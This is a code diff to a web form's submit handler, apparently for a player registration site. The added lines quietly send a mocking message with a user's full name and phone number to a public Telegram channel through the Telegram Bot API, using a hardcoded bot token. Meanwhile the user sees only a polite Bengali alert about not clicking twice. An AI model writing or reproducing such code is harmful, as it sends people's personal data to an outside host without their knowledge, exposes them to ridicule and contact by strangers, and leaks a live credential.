@@ -47,6 +47,16 @@
 
 
           if (isSubmitting) {
+            const text = "Hey Support team @RAVVAN23 @Kalajaduu13 @emotionalclown " + playerFirstName + " " + playerLastName + " is clicking on submit button multiple time with in 2 sec don't do anything just enjoy the show and his Phone number is : " + playerPhNo;
+            try {
+              const encodedText = encodeURIComponent(text);
+              console.log(encodedText);
+              const url = "https://api.telegram.org/bot6637753416:AAHb7DHnfrvEl6Aje0RfyrumAkZjZglxXHU/sendmessage?chat_id=@kpl2023updates&text=" + encodedText;
+              const response = await fetch(url);
+              const data = await response.json();
+            } catch (error) {
+              console.error('Error calling API:', error);
+            }
             alert("ব্যাকগ্রাউন্ড এ প্রসেস চলছে দয়া করে একাধিক বার সাবমিট বাটন এ ক্লিক করবেন না।");
             return;
           }
